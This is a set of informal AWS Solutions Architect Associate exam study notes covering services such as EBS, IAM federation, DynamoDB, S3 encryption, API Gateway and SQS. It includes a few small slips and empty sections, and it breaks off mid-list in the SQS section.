<p>You can use Amazon Data Lifecycle Manager (Amazon DLM) to automate the creation, retention, and deletion of snapshots taken to back up your Amazon EBS volumes. Automating snapshot management helps you to:  - Protect valuable data by enforcing a regular backup schedule.  - Retain backups as required by auditors or internal compliance.  - Reduce storage costs by deleting outdated backups.</p>
</li>
<li>
<p>AWS Global Accelerator and Amazon CloudFront are separate services that use the AWS global network and its edge locations around the world. CloudFront improves performance for both cacheable content (such as images and videos) and dynamic content (such as API acceleration and dynamic site delivery). Global Accelerator improves performance for a wide range of applications over TCP or UDP by proxying packets at the edge to applications running in one or more AWS Regions. Global Accelerator is a good fit for non-HTTP use cases, such as gaming (UDP), IoT (MQTT), or Voice over IP, as well as for HTTP use cases that specifically require static IP addresses or deterministic, fast regional failover. Both services integrate with AWS Shield for DDoS protection.</p>
</li>
<li>
<p>A Gateway endpoint is a type of VPC endpoint that provides reliable connectivity to Amazon S3 and DynamoDB without requiring an internet gateway or a NAT device for your VPC. Instances in your VPC do not require public IP addresses to communicate with resources in the service.</p>
</li>
<li>
<p>AWS DataSync makes it simple and fast to move large amounts of data online between on-premises storage and Amazon S3, Amazon Elastic File System (Amazon EFS), or Amazon FSx for Windows File Server. Manual tasks related to data transfers can slow down migrations and burden IT operations. DataSync eliminates or automatically handles many of these tasks, including scripting copy jobs, scheduling, and monitoring transfers, validating data, and optimizing network utilization. The DataSync software agent connects to your Network File System (NFS), Server Message Block (SMB) storage, and your self-managed object storage, so you don‚Äôt have to modify your applications.  DataSync can transfer hundreds of terabytes and millions of files at speeds up to 10 times faster than open-source tools, over the Internet or AWS Direct Connect links. You can use DataSync to migrate active data sets or archives to AWS, transfer data to the cloud for timely analysis and processing, or replicate data to AWS for business continuity. Getting started with DataSync is easy: deploy the DataSync agent, connect it to your file system, select your AWS storage resources, and start moving data between them. You pay only for the data you move.</p>
</li>
<li>
<p>Here is a list of important information about EBS Volumes:</p>
<ul>
<li>
<p>When you create an EBS volume in an Availability Zone, it is automatically replicated within that zone to prevent data loss due to a failure of any single hardware component.</p>
</li>
<li>
<p>An EBS volume can only be attached to one EC2 instance at a time.</p>
</li>
<li>
<p>After you create a volume, you can attach it to any EC2 instance in the same Availability Zone</p>
</li>
<li>
<p>An EBS volume is off-instance storage that can persist independently from the life of an instance. You can specify not to terminate the EBS volume when you terminate the EC2 instance during instance creation.</p>
</li>
<li>
<p>EBS volumes support live configuration changes while in production which means that you can modify the volume type, volume size, and IOPS capacity without service interruptions.</p>
</li>
<li>
<p>Amazon EBS encryption uses 256-bit Advanced Encryption Standard algorithms (AES-256)</p>
</li>
<li>
<p>EBS Volumes offer 99.999% SLA.</p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="table-of-contents-10"><a href="#table-of-contents-10" class="header">Table of Contents</a></h1>
<h2 id="table-of-contents-4"><a class="header" href="#table-of-contents-4">Table of Contents</a></h2>
<ul>
<li><a href="#amazon-ebs">Amazon EBS</a></li>
<li><a href="#cloudwatch-1">Cloudwatch</a></li>
<li><a href="#aws-identity-and-access-management">AWS Identity and Access Management</a></li>
<li><a href="#rds">RDS</a></li>
<li><a href="#athena">Athena</a></li>
<li><a href="#kinesis-1">Kinesis</a></li>
<li><a href="#dynamodb-1">DynamoDB</a></li>
<li><a href="#storage-gateway">Storage Gateway</a></li>
<li><a href="#elastic-load-balancer">Elastic Load Balancer</a></li>
<li><a href="#security-group">Security Group</a></li>
<li><a href="#route-53">Route 53</a></li>
<li><a href="#aws-transit-gateway">AWS Transit Gateway</a></li>
<li><a href="#amazon-emr">Amazon EMR</a></li>
<li><a href="#auto-scaling">Auto Scaling</a></li>
<li><a href="#s3-1">S3</a></li>
<li><a href="#cloudfront-1">Cloudfront</a></li>
<li><a href="#secrets-manager">Secrets Manager</a></li>
<li><a href="#textract">Textract</a></li>
<li><a href="#rpo-and-rto">RPO and RTO</a></li>
<li><a href="#ec2-1">EC2</a></li>
<li><a href="#network-firewall">Network Firewall</a></li>
<li><a href="#security">Security</a></li>
</ul>
<h2 id="amazon-ebs"><a class="header" href="#amazon-ebs">Amazon EBS</a></h2>
<hr>
<ul>
<li>
<p><b> Amazon EBS </b> provides three volume types to best meet the needs of your workloads:</p>
<ul>
<li><b> General Purpose (SSD) </b>
<ul>
<li>General Purpose (SSD) volumes are suitable for a <ins>broad range of workloads, including small to medium-sized databases, development and test environments, and boot volumes.</ins></li>
</ul>
</li>
<li><b> Provisioned IOPS (SSD) </b>
<ul>
<li>These volumes offer storage with consistent and low-latency performance and are designed for I/O intensive applications such as <ins>large relational or NoSQL databases. </ins></li>
</ul>
</li>
<li><b>Magnetic</b>
<ul>
<li>for workloads where <ins>data are accessed infrequently, and applications where the <i>lowest storage cost</i> is important. </ins></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Here is a list of important information about EBS Volumes:</p>
<ul>
<li>
<p>When you create an EBS volume in an Availability Zone, it is automatically replicated within that zone to prevent data loss due to a failure of any single hardware component.</p>
</li>
<li>
<p>An EBS volume can only be attached to one EC2 instance at a time.</p>
</li>
<li>
<p>After you create a volume, you can attach it to any EC2 instance in the same Availability Zone</p>
</li>
<li>
<p>An EBS volume is off-instance storage that can persist independently from the life of an instance. You can specify not to terminate the EBS volume when you terminate the EC2 instance during instance creation.</p>
</li>
<li>
<p>EBS volumes support live configuration changes while in production which means that you can modify the volume type, volume size, and IOPS capacity without service interruptions.</p>
</li>
<li>
<p>Amazon EBS encryption uses 256-bit Advanced Encryption Standard algorithms (AES-256)</p>
</li>
<li>
<p>EBS Volumes offer 99.999% SLA. This</p>
</li>
</ul>
</li>
</ul>
<h2 id="cloudwatch-1"><a class="header" href="#cloudwatch-1">Cloudwatch</a></h2>
<hr>
<ul>
<li>Monitoring tool for your AWS resources and applications.</li>
<li><ins> Display metrics and create alarms </ins> that watch the metrics and send notifications or automatically make changes to the resources you are monitoring when a threshold is breached.</li>
</ul>
<h2 id="aws-identity-and-access-management"><a class="header" href="#aws-identity-and-access-management">AWS Identity and Access Management</a></h2>
<hr>
<ul>
<li>
<p>You should <ins> <i><strong>always associate IAM role to EC2 instances not IAM user for the purpose of accessing other AWS services  </strong></i></ins></p>
</li>
<li>
<p><strong> IAM roles </strong> are designed so that your <ins>application can <i>securely make API requests</i> from your instances,</ins> without requiring you to manage the security credentials that the application use.</p>
<ul>
<li>Instead of creating and distributing your AWS credentials, you can <ins>delegate permission to make API requests using <strong>IAM roles</strong></ins></li>
</ul>
</li>
<li>
<p><strong>AWS Organization</strong> is a service that allows you to manage multiple AWS accounts easily.</p>
</li>
<li>
<p><strong>AWS IAM Identity Center </strong> can be integrated with your corporate directory service for centralized authentication.</p>
<ul>
<li>This means you can <ins>sign in to multiple AWS accounts with just one set of credentials.</ins></li>
<li>This integration helps to streamline the authentication process and makes it <ins>easier for companies to switch between accounts.</ins></li>
</ul>
</li>
<li>
<p><strong>SCP</strong> you can also configure a <ins>service control policy (SCP) </ins>to manage your AWS accounts.</p>
<ul>
<li>SCPs help you <ins> enforce policies across your organization and control the services </ins> and features accessible to your other account.</li>
<li>prevents unauthorized access</li>
</ul>
</li>
<li>
<p><strong>Security Token Service (STS)</strong> is the service that you can use to <ins>create and provide trusted users with temporary security credentials</ins> that can control access to your AWS resources.</p>
<ul>
<li><ins>Temporary security credentials work almost identically to the long-term access key credentials</ins> that your IAM users can use.</li>
</ul>
</li>
<li>
<p><strong> AWS Control Tower </strong> provides a single location to easily <ins> set up your new well-architected multi-account environment </ins> and govern your AWS workloads with rules for security,operations, and internal compliance.</p>
<ul>
<li>You can automate the setup of your AWS environment with best-practices <ins>blueprints for multi-account structure, identity, access management, and account provisioning workflow. </ins></li>
<li><ins> offers ‚Äúguardrails‚Äù </ins> for ongoing governance of your AWS environment.</li>
</ul>
</li>
<li>
<p>You can use an <i><ins>IAM role to specify permissions for users </ins></i> whose identity is federated from your organization or a third-party identity provider (IdP).</p>
<ul>
<li><b>Federating users with SAML 2.0</b>
<ul>
<li>If your organization already uses an identity provider <ins>software package that supports SAML 2.0 (Security Assertion Markup Language 2.0)</ins>, you can create trust between your organization as an identity provider (IdP) and AWS as the service provider.</li>
<li>You can then use SAML to provide your users with <ins>federated single-sign on (SSO) </ins>to the AWS Management Console or federated access to call AWS API operations.</li>
<li><b>For example</b>: if your company uses Microsoft Active Directory and Active Directory Federation Services, then you can federate using SAML 2.0</li>
</ul>
</li>
<li><b>Federating users by creating a custom identity <ins>broker application</ins></b>
<ul>
<li>
<p>If your <ins>identity store is not compatible with SAML 2.0,</ins> then you can <i>build a custom <b>identity broker application </b> to perform a similar function. </i></p>
</li>
<li>
<p>The broker application <ins>authenticates users, requests temporary credentials for users from AWS,</ins> and then provides them to the user to access AWS resources.</p>
</li>
<li>
<p>The application verifies that employees are signed into the existing corporate network‚Äôs identity and authentication system, which might use LDAP, Active Directory, or another system. The identity broker application then obtains temporary security credentials for the employees.</p>
</li>
<li>
<p>To <i>get temporary security credentials, </i>the identity broker application calls either <code>AssumeRole</code> or <code>GetFederationToken</code> to obtain temporary security credentials, depending on how you want to manage the policies for users and when the temporary credentials should expire.</p>
</li>
<li>
<p>The <ins>call returns temporary security credentials consisting of an AWS access key ID, a secret access key, and a session token.</ins> The identity broker application makes these temporary security credentials available to the internal company application.</p>
  <img src="clouds/aws/saa-c03/images/Overview/broker-application.jpg" width="47%" height="40%" />
</li>
<li>
<p>This scenario has the following attributes:</p>
<ul>
<li>
<p>The identity broker application has permissions to access IAM‚Äôs token service (STS) API to create temporary security credentials.</p>
</li>
<li>
<p>The identity broker application is able to verify that employees are authenticated within the existing authentication system.</p>
</li>
<li>
<p>Users are able to get a temporary URL that gives them access to the AWS Management Console (which is referred to as single sign-on).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rds"><a class="header" href="#rds">RDS</a></h2>
<hr>
<ul>
<li>Supports <b>Aurora, MySQL, MariaDB, PostgreSQL, Oracle, Microsoft SQL Server.</b></li>
<li><b>DB Instance </b>
<ul>
<li>For production OLTP use cases, use <b>Multi-AZ deployments </b> for <ins>enhanced fault tolerance with Provisioned <i>IOPS </i>storage for fast and predictable performance.
<ul>
<li>You can use PIOPS storage with Read Replicas for MySQL, MariaDB or PostgreSQL.</li>
</ul>
</ins></li>
<li><b> Magnetic </b>
<ul>
<li>Doesn‚Äôt allow you to scale storage when using the SQL Server database engine.
<ul>
<li>Doesn‚Äôt support elastic volumes.</li>
<li>Limited to a maximum size of 3 TiB.</li>
<li>Limited to a maximum of 1,000 IOPS.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>RDS automatically performs a failover in the event of any of the following:
<ol>
<li>Loss of availability in primary Availability Zone.</li>
<li>Loss of network connectivity to primary.</li>
<li>Compute unit failure on primary.</li>
<li>Storage failure on primary.</li>
</ol>
</li>
</ul>
<h2 id="athena"><a class="header" href="#athena">Athena</a></h2>
<hr>
<ul>
<li>An interactive query service that makes it easy to analyze data directly in Amazon S3 and other data sources using SQL.</li>
<li><i>Serverless</i></li>
<li>Has a <ins>built-in query editor.</ins></li>
<li>highly available and durable</li>
<li><ins>integrates with <b>Amazon QuickSight </b></ins> for easy data visualization.</li>
<li>retains query history for 45 days.</li>
<li>You pay only for the queries that you run. You are charged based on the amount of data scanned by each query.</li>
<li>There are 2 types of cost controls:
<ul>
<li><b> Per-query limit </b>
<ul>
<li>specifies a threshold for the total amount of data scanned per query.</li>
<li>Any query running in a workgroup is <ins>canceled once it exceeds the specified limit</ins>.</li>
<li>Only one per-query limit can be created</li>
</ul>
</li>
<li><b>Per-workgroup limit</b>
<ul>
<li>this limits the total amount of data scanned by all queries running within a specific time frame.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="kinesis-1"><a class="header" href="#kinesis-1">Kinesis</a></h2>
<hr>
<ul>
<li>A fully managed AWS service that you can use to stream <ins> live video from devices to the AWS Cloud</ins>, or build applications for <strong> real-time video processing or batch-oriented video analytics.</strong></li>
<li>Amazon Kinesis Data Streams enables real-time processing of streaming big data. It provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Amazon Kinesis Applications</li>
<li>A Kinesis data stream is a set of <ins>shards that has a sequence of data records </ins>, and each data record has a <strong>sequence number </strong>that is assigned by Kinesis Data Streams.
<ul>
<li>Kinesis <ins>can also easily handle the high volume of messages</ins> being sent to the service.</li>
<li>durable</li>
<li>no missing of messages</li>
</ul>
</li>
</ul>
<h2 id="dynamodb-1"><a class="header" href="#dynamodb-1">DynamoDB</a></h2>
<ul>
<li>
<h3 id="how-to-choose-the-right-partition-key-"><a class="header" href="#how-to-choose-the-right-partition-key-">How to choose the right partition key ?</a></h3>
<ul>
<li>What is partition key ?
<ul>
<li>DynamoDB supports 2 types of primary keys
<ul>
<li>Partition key: <ins> A simple primary key,</ins> composed of one attribute known as the partition key.</li>
<li>Partition key and Sort key: Referred to as Composite Primary Key, this type of key is composed of two attributes. 1st one is partition key and 2nd one is sort key
<img src="clouds/aws/saa-c03/images/Overview/DynamoDB.png" width="87%" /></li>
</ul>
</li>
</ul>
</li>
<li>Why do I need a partition key?
<ul>
<li>DynamoDb stores data as groups of attributes, - Items</li>
<li>Items are similar to rows or records in other database systems.</li>
<li>DynamoDB stores and retrieves each item based on the primary key value which must be unique</li>
<li><ins><strong><i>DynamoDb uses the partition key‚Äôs value as an input to an internal hash function. </i></strong> The output from the hash function determines the partition in which the item is stored. Each item‚Äôs location is determined by the hash value of its partition key.
<img src="clouds/aws/saa-c03/images/Overview/dynamodb-partition.png" width="87%" /></ins></li>
</ul>
</li>
<li>DynamoDB automatically supports access patterns using the throughput you have provisioned, or upto your account limits in the on-demand mode</li>
<li>Regardless of the capacity mode you choose <ins><strong><i> if your access pattern exceeds 3000 RCU and 1000 WCU for a single partition key value, your requests might be throttled with a  <code>ProvisionedThroughputExceededException</code> error </i></strong></ins></li>
<li>Recommended for Partition keys :
<ul>
<li><ins> Use high-cardinality attributes. </ins> These are attributes that have distinct values for each item, like <code>emailid</code>, <code>employee_no</code>, <code>customerid</code>, <code>sessionid</code>, <code>orderid</code></li>
<li><ins><strong>Use composite attributes </strong> Try to combine more tha one attribute to form a unique key, if that meets your access pattern</ins></li>
<li><strong><ins>Cache the popular items</ins></strong> when there is high volume of read traffic using DAX (DynamoDB Accelerator)</li>
<li>DAX is fully managed, in-memory cache for DynamoDB that doesn‚Äôt require developers to manage cache invalidation, data population or cluster management.</li>
<li>DAX also is compatible with DynamoDB API calls, so developer can incorporate it more easily into existing applications</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="storage-gateway"><a class="header" href="#storage-gateway">Storage Gateway</a></h2>
<hr>
<ul>
<li>
<p>Connects an on-premise software appliance with cloud-based storage to <ins>provide seamless integration with data security features between your <b>on-premises IT environment and the AWS storage infrastructure.</b></ins></p>
</li>
<li>
<p>You can use the service to store data in the AWS cloud for scalable and cost-effective storage that helps maintain</p>
</li>
<li>
<p>It stores files as native S3 objects, archives virtual tapes in Amazon Glacier and stores EBS snapshots generated by the Volume Gateway with Amazon EBS.</p>
  <img src="clouds/aws/saa-c03/images/Overview/storage-gateway.jpg" width="87%" />
</li>
</ul>
<h2 id="elastic-load-balancer"><a class="header" href="#elastic-load-balancer">Elastic Load Balancer</a></h2>
<hr>
<ul>
<li>Distributes incoming application or network traffic across multiple targets, such as EC2 instances containers (ECS), Lambda functions and IP addresses in multiple Availability zones</li>
</ul>
<h2 id="security-group"><a class="header" href="#security-group">Security Group</a></h2>
<hr>
<ul>
<li>
<p>A security group acts as a virtual firewall for your instance to control inbound and outbound traffic.</p>
   <img src="clouds/aws/saa-c03/images/Overview/security-group.jpg" width="87%" />
</li>
</ul>
<h2 id="route-53"><a class="header" href="#route-53">Route 53</a></h2>
<hr>
<ul>
<li>A highly available and scalable Domain Name System (DNS) web service used for domain registration, DNS routing and health checking</li>
</ul>
<h2 id="aws-transit-gateway"><a class="header" href="#aws-transit-gateway">AWS Transit Gateway</a></h2>
<hr>
<ul>
<li>A networking service that uses a hub and spoke model to connect the on-premises data centers and Amazon VPCs to a <ins><em>Single Gateway.</em></ins></li>
<li>With this service, customers only have to create and manage  <ins><em><strong>a single connection from the central gateway into each on-premises data center</strong></em></ins></li>
<li><strong>Features</strong>:
<ul>
<li><strong>Inter-region peering </strong>
<ul>
<li>allows customers to route traffic</li>
<li>easy and cost-effective way</li>
</ul>
</li>
<li><strong> Multicast </strong>
<ul>
<li>allows customers to have fine-grain control on who can consume and produce multicast traffic</li>
</ul>
</li>
<li><strong>Automated provisioning </strong>
<ul>
<li>customers can automatically identify the Site-to-site VPN connections and on-premises resources with which they are associated using AWS Transit Gateway</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="amazon-emr"><a class="header" href="#amazon-emr">Amazon EMR</a></h2>
<hr>
<ul>
<li>
<p>EMR (Elastic MapReduce)</p>
</li>
<li>
<p>A managed cluster that <ins>simplifies running big data frameworks </ins>like Apache Hadoop and Apache Spark on AWS to process and analyze vast amounts of data.</p>
</li>
<li>
<p>You can process data for analytics purposes and <ins>business intelligence workloads </ins>using EMR together with Apache Hive and Apache Pig</p>
</li>
<li>
<p>You can <ins><em>use EMR to move large amounts of data in and out of other AWS data stores </em></ins> and databases like S3 and DynamoDB</p>
  <img src="clouds/aws/saa-c03/images/Overview/emr.jpg" width="87%" />
</li>
<li>
<p>Purchasing options:</p>
<ul>
<li>On-Demand:reliable, predictable, won‚Äôt be terminated</li>
<li>Reserved (min 1 year): cost savings (EMR will automatically use if available)</li>
</ul>
</li>
</ul>
<h2 id="auto-scaling"><a class="header" href="#auto-scaling">Auto Scaling</a></h2>
<hr>
<ul>
<li>Configure automatic scaling for the AWS resources quickly through a scaling plan that uses <strong> Dynamic Scaling </strong>and <strong>Predictive scaling </strong>.</li>
<li><strong><em>Useful for </em></strong>:
<ul>
<li>Cyclical traffic such as high use of resources during regular business hours and low use of resources</li>
<li>On and Off traffic such as <ins>batch processing, testing and periodic analysis </ins></li>
<li>Variable traffic patterns, such as software for <ins>marketing growth with periods of spiky growth </ins></li>
</ul>
</li>
<li><strong>Dynamic Scaling</strong>
<ul>
<li>To add and remove capacity for resources to maintain resource at target value</li>
</ul>
</li>
<li><strong>Predictive Scaling</strong>
<ul>
<li>To forecast the future load demands by analyzing your historical records for a metric</li>
<li><ins>Allows schedule scaling </ins> by adding or removing capacity and controls maximum capacity</li>
<li><ins><em> <strong>Only available for EC2 scaling groups </strong></em></ins></li>
</ul>
</li>
<li>In Auto Scaling, the following statements are correct regarding the cooldown period:
<ul>
<li>It ensures that the Auto Scaling group does not launch or terminate additional EC2 instances before the previous scaling activity takes effect.</li>
<li>Its default value is 300 seconds.</li>
<li>It is a configurable setting for your Auto Scaling group.</li>
</ul>
</li>
</ul>
<h2 id="s3-1"><a class="header" href="#s3-1">S3</a></h2>
<hr>
<ul>
<li><strong>Server-side encryption (SSE)</strong> is about data encryption at rest-that is, Amazon S3 encrypts your data at the object level as it writes it to disks in its data centers and decrypts it for you when you access it.
<img src="clouds/aws/saa-c03/images/Overview/server-side-encryption.jpg" width="87%" />
<ul>
<li>
<p>You have three mutually exclusive options depending on how you choose to manage the encryption keys:</p>
<p>1.<strong>Amazon S3-Managed Keys (SSE-S3) </strong></p>
<ol start="2">
<li>
<p><strong>AWS KMS-Managed Keys (SSE-KMS)</strong></p>
</li>
<li>
<p><strong>Customer-Provided Keys (SSE-C)</strong></p>
</li>
</ol>
</li>
<li>
<p><strong> S3-Managed Encryption Keys (SSE-S3)</strong></p>
<ul>
<li>Amazon S3 will <ins>encrypt each object with a unique key</ins> and as an additional safeguard,<ins> it encrypts the key itself with a master key that it<strong> rotates regularly. </strong></ins></li>
</ul>
</li>
<li>
<p><strong> SSE-AES </strong> S3 handles the key, uses AES-256 algorithm</p>
<ul>
<li>one of the strongest block ciphers available, 256-bit Advanced Encryption Standard (AES-256), to encrypt your data.
<img src="clouds/aws/saa-c03/images/Overview/aes-256.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li><strong>Client-side Encryption </strong>using
<ol>
<li>AWS KMS-managed customer master key</li>
<li>client-side master key</li>
</ol>
</li>
<li><strong>Cross-Account Access</strong>
You can provide another AWS account access to an object that is stored in an S3 bucket.
<ul>
<li>
<p>These are the methods on how to grant cross-account access to objects that are stored in your own Amazon S3 bucket:</p>
<ul>
<li><strong>Resource-based policies and IAM policies </strong></li>
<li><strong>Resource-based Access Control List (ACL) and IAM policies </strong></li>
</ul>
</li>
<li>
<p>Cross-account IAM roles for programmatic and console access to S3 bucket objects</p>
</li>
<li>
<p><ins> Supports failover controls for S3 Multi-Region access points.</ins></p>
</li>
</ul>
</li>
<li><strong>Requester Pays Buckets </strong>
<ul>
<li>Bucket owners pay for all of the Amazon S3 storage and data transfer costs associated with their bucket.</li>
</ul>
</li>
</ul>
<h2 id="cloudfront-1"><a class="header" href="#cloudfront-1">CloudFront</a></h2>
<hr>
<h2 id="secrets-manager"><a class="header" href="#secrets-manager">Secrets Manager</a></h2>
<hr>
<ul>
<li>Helps to <ins> <i> manage, retrieve and <strong>rotate database credentials,</strong> application credentials, OAuth tokens, API keys and other secrets throughout their lifecycles
</i></ins></li>
<li>Helps to <ins> improve security posture </ins>, because you <ins><strong>no longer need hard-coded credentials</strong> </ins> in application source code.
<ul>
<li>Storing the credentials in Secrets Manager helps avoid possible compromise by anyone who can inspect the application or the components.</li>
<li>Replace hard-coded credentials with a runtime call to the Secrets Manager service to retrieve credentials with a runtime call to the Secrets Manager service to retrieve credentials dynamically when you need them.</li>
</ul>
</li>
</ul>
<h2 id="textract"><a class="header" href="#textract">Textract</a></h2>
<hr>
<ul>
<li>A fully managed document analysis service for detecting and extracting information from scanned documents</li>
<li>Return extracted data as key-value pairs (e.g. Name: John Doe)</li>
<li>Supports virtually any type of documents</li>
<li>Pricing
<ul>
<li>Pay for what you use</li>
<li>Charges vary for Detect Document Text API and Analyze Document API with the later being more expensive</li>
</ul>
</li>
</ul>
<h2 id="rpo-and-rto"><a class="header" href="#rpo-and-rto">RPO and RTO</a></h2>
<hr>
<ul>
<li>RTO (Recovery Time Object)
<ul>
<li>measures how quickly the application should be available after an outage</li>
</ul>
</li>
<li>RPO (Recovery Point Object)
<ul>
<li>refers to how much data loss can the application can tolerate</li>
</ul>
</li>
</ul>
<img src="clouds/aws/saa-c03/images/Overview/rto-rpo.jpg" width="87%" />
<pre><code>- Data loss is measured from most recent backup to the point of disaster. Downtime is measured from the point of disaster until fully recovered and available for service.
</code></pre>
<h2 id="ec2-1"><a class="header" href="#ec2-1">EC2</a></h2>
<hr>
<hr>
<h2 id="network-firewall"><a class="header" href="#network-firewall">Network Firewall</a></h2>
<hr>
<ul>
<li>AWS Network Firewall supports domain name stateful network traffic inspection</li>
<li>Can create <ins>allow lists and deny lists </ins> with domain names that the stateful rules engine looks for in network traffic</li>
<li>AWS Network Firewall is a <ins>stateful, managed network firewall and intrusion detection and prevention service for your virtual private cloud (VPC)</ins> that you created in Amazon Virtual Private Cloud (Amazon VPC).
<ul>
<li>With Network Firewall, <ins>you can filter traffic at the perimeter of your VPC. </ins></li>
<li>This includes filtering traffic going to and coming from an internet gateway, NAT gateway, or over VPN or AWS Direct Connect.</li>
</ul>
</li>
<li>Network Firewall uses the open source intrusion prevention system (IPS), Suricata, for stateful inspection. Network Firewall supports Suricata compatible rules.</li>
</ul>
<hr>
<h2 id="security"><a class="header" href="#security">Security</a></h2>
<hr>
<ul>
<li>
<p>The security pillar includes the ability to protect data, systems, and assets to take advantage of cloud technologies to improve security</p>
</li>
<li>
<p><strong>Zero Trust</strong> security is a model where application <ins>components or microservices are considered discrete from each other </ins> and no component or microservice trusts any other.</p>
<h3 id="design-principles"><a class="header" href="#design-principles">Design Principles</a></h3>
<ol>
<li>
<p><strong> Implement a strong identity foundation </strong></p>
</li>
<li>
<p><strong>Enable traceability</strong></p>
</li>
<li>
<p><strong>Apply security at all layers:</strong></p>
<ul>
<li>
<p>Apply a <strong>defense in depth approach </strong>  with multiple security controls</p>
</li>
<li>
<p><ins>Implementing security to multiple layers </ins>(for example, edge of network, VPC, load balancing, every instance and compute service, operating system, application, and code).</p>
  <img src="clouds/aws/saa-c03/images/Overview/defense-in-depth.jpg" width="57%" />
</li>
</ul>
</li>
<li>
<p><strong>Automate security best practices:</strong></p>
</li>
<li>
<p><strong>Protect data in transit and at rest:</strong></p>
</li>
<li>
<p><strong>Keep people away from data:</strong></p>
</li>
<li>
<p><strong>Prepare for security events:</strong></p>
</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="study-more"><a href="#study-more" class="header">Study-more</a></h1>
<p>[ ] Spot Fleets
[ ] Reserved Instances vs. Dedicated Hosts</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tutorialsdojo-cheatsheets"><a href="#tutorialsdojo-cheatsheets" class="header">Tutorialsdojo Cheatsheets</a></h1>
<ul>
<li><a href="https://tutorialsdojo.com/aws-identity-and-access-management-iam/?src=udemy">IAM</a></li>
<li><a href="https://tutorialsdojo.com/aws-directory-service/?src=udemy">AWS Directory Service</a></li>
<li><a href="https://tutorialsdojo.com/amazon-s3/?src=udemy">S3</a></li>
<li><a href="https://tutorialsdojo.com/amazon-relational-database-service-amazon-rds/?src=udemy">RDS</a></li>
<li><a href="https://tutorialsdojo.com/amazon-aurora/?src=udemy">Aurora</a></li>
<li><a href="https://tutorialsdojo.com/amazon-dynamodb/?src=udemy">DynamoDB</a></li>
<li><a href="https://tutorialsdojo.com/amazon-ebs/?src=udemy">EBS</a></li>
<li><a href="https://tutorialsdojo.com/amazon-route-53/?src=udemy">Route53</a></li>
<li><a href="https://tutorialsdojo.com/aws-auto-scaling/?src=udemy">Auto Scaling</a></li>
<li><a href="https://tutorialsdojo.com/aws-key-management-service-aws-kms/?src=udemy">KMS</a></li>
<li><a href="#tutorialsdojo-cheatsheets">EFS</a></li>
<li></li>
<li><a href="https://tutorialsdojo.com/aws-cloudhsm/">cloudHSM (optional)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="api-gateway-cheatsheet"><a href="#api-gateway-cheatsheet" class="header">Api-gateway-cheatsheet</a></h1>
<ul>
<li>
<p>Enables developers to create, publish, maintain, monitor, and secure APIs at any scale</p>
</li>
<li>
<p>Create RESTful or WebSocket APIs</p>
</li>
<li>
<p>HIPAA compliant service</p>
</li>
<li>
<p>Allows creating, deploying and managing a RESTful API to expose backend HTTP endpoints, Lambda functions or other AWS services</p>
</li>
<li>
<p>Concepts</p>
<ul>
<li>API deployment
<ul>
<li>a point-in-time snapshot of your API Gateway API resource and methods. To be available for clients to use, the deployment must be associated with one or more API stages</li>
</ul>
</li>
<li>API endpoints
<ul>
<li>host names APIs in API Gateway, which are deployed to a specific region and of the format: rest-api-id.execute-api.region.amazonaws.com</li>
</ul>
</li>
<li>Usage Plan
<ul>
<li>Provides selected API clients with access to one or more deployed APISs. You can use a usage plan to configure throttling and quota limits, which are enforced on individual client API keys</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Features:</p>
<ul>
<li>Amazon API Gateway provides <b> <ins> throttling at multiple levels including global and by a service call.</ins></b> Throttling limits can be set for standard rates and bursts.
<ul>
<li>For example, API owners can set a rate limit of 1,000 requests per second for a specific method in their REST APIs, and also configure Amazon API Gateway to handle a burst of 2,000 requests per second for a few seconds.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Endpoint Types</p>
<ul>
<li>Edge-optimized: For global clients
<ul>
<li>Requests are routed through a Cloudfront Edge Location for improved latency</li>
<li>The API Gateway still only lives in one region</li>
</ul>
</li>
<li>Regional: for clients within the same region
<ul>
<li>You could still manually combine with CloudFront for control over caching strategies</li>
</ul>
</li>
<li>Private: Only accessible in our VPC
<ul>
<li>Use a resource policy to define access</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Stages</p>
<ul>
<li>Create stages for different deployments of the API. Example: Production, Sandbox, QA, etc.</li>
<li>Switch between stages seamlessly</li>
<li>Similar to Azure Web App Deployment Slots</li>
<li>Use stage variables</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="queueing-sqs-1"><a href="#queueing-sqs-1" class="header">Queueing (SQS)</a></h1>
<ul>
<li><a href="#queueing-sqs">Queueing (SQS) </a></li>
<li><a href="#sqs-message-visibility-timeout">SQS Message Visibility Timeout</a></li>
<li><a href="#long-polling">Long Polling</a></li>
<li><a href="#streaming-and-kinesis">Streaming and Kinesis</a>
<ul>
<li><a href="#kinesis-data-streams-1">Kinesis Data Streams</a></li>
<li><a href="#kinesis-data-firehose-1">Kinesis Data Firehose</a></li>
<li><a href="#kinesis-data-streams-vs-firehose">Kinesis Data Streams vs Firehose</a></li>
<li><a href="#kinesis-data-analytics">Kinesis Data Analytics</a></li>
<li><a href="#kinesis-video-streams">Kinesis Video Streams</a></li>
</ul>
</li>
<li><a href="#pubsub-sns">Pub-Sub and SNS</a>
<ul>
<li><a href="#what-is-pub-sub">What is Pub/Sub ?</a></li>
</ul>
</li>
<li><a href="#sqs-and-sns---fan-out-pattern">SQS and SNS - Fan Out Pattern</a></li>
</ul>
<hr>
<h2 id="queueing-sqs"><a class="header" href="#queueing-sqs">Queueing (SQS)</a></h2>
<hr>
<ul>
<li>
<p><b> What is Messaging System ?</b></p>
<ul>
<li>Used to provide asynchronous communication and decouple processes via messages / events from sender and receiver (producer and consumer)</li>
</ul>
</li>
<li>
<p><b> What is Queuing System ?</b></p>
<ul>
<li>A queueing system is a <ins> messaging system that generally will <b> delete </b> messages once they are consumed </ins>.</li>
<li>Simple Communication</li>
<li><ins> <i> Not Real-time  </i></ins></li>
<li>Have to pull</li>
